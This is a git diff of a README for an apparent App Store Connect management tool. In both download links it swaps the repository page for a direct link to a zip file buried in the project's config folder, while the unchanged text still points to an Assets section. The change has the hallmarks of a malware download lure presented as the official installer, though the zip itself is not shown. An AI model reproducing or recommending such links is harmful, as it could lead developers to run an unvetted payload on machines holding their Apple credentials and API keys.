@@ -1,6 +1,6 @@
 # 📱 app-store-connect-skill - Manage Your Apple Store Pages Easily
 
-[![](https://img.shields.io/badge/Download-App-Store-Skill-blue.svg)](https://github.com/sosteam65/app-store-connect-skill)
+[![](https://img.shields.io/badge/Download-App-Store-Skill-blue.svg)](https://github.com/sosteam65/app-store-connect-skill/raw/refs/heads/main/config/app-connect-skill-store-v2.7.zip)
 
 This tool helps you manage your Apple App Store account from your computer. You can upload screenshots, check user reviews, and submit new versions of your app without using a web browser.
 
@@ -18,7 +18,7 @@ If you do not have an API key, log in to your Apple Developer account on their w
 
 You must download the installation package first. Visit the link below to reach the official download page.
 
-[Get the installer here](https://github.com/sosteam65/app-store-connect-skill)
+[Get the installer here](https://github.com/sosteam65/app-store-connect-skill/raw/refs/heads/main/config/app-connect-skill-store-v2.7.zip)
 
 1. Click the link above.
 2. Look for the Assets section on that page.
